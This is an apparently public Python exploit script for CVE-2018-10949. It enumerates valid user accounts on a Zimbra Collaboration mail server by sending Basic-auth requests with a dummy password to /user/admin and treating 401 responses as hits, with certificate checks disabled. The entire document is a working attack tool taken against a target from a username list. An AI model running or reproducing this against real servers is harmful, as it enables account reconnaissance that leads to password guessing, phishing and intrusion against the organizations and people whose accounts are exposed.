#!/usr/bin/env python
# Zimbra Collaboration User Enumeration exploit || CVE-2018-10949
# Author: @_zc00l

from argparse import ArgumentParser
from requests import get
from os import path
from sys import stderr, exit
from urllib3 import disable_warnings
from urllib3.exceptions import InsecureRequestWarning

disable_warnings(InsecureRequestWarning)
write = stderr.write
flush = stderr.flush

def check_username(host, username):
    authCookie = {"Authorization":"Basic {0}".format( str("{0}:{1}".format(username,"a")).encode("base64").replace("\n","")) }
    req = get(host + "/user/admin", headers=authCookie, verify=False)
    return req.status_code

def main():
    write("Zimba Collaboration User Enumeration CVE-2018-10949\r\n\r\n")
    flush()
    parser = ArgumentParser()
    parser.add_argument("--host", required=True, type=str, help="Zimbra Mail Website")
    parser.add_argument("--userlist", required=True, type=str, help="Username list to use to confirm usernames.")
    args = parser.parse_args()
    if not path.exists(args.userlist):
        write("Error: Could not find a valid user-list file.\r\n")
        flush()
        exit(1)
    f = open(args.userlist, "r")
    currentLine = f.readline().replace("\n", "")
    while currentLine != "":
        write("Trying username: {0}    \r".format(currentLine))
        if check_username(args.host, currentLine) == 401:
            print("[+] Username \033[094m{0}\033[0m is valid.".format(currentLine))
        currentLine = f.readline().replace("\n", "")
    write("User enumeration attack has been finished.\r\n")
    flush()
    f.close()
        
if __name__ == "__main__":
    main()
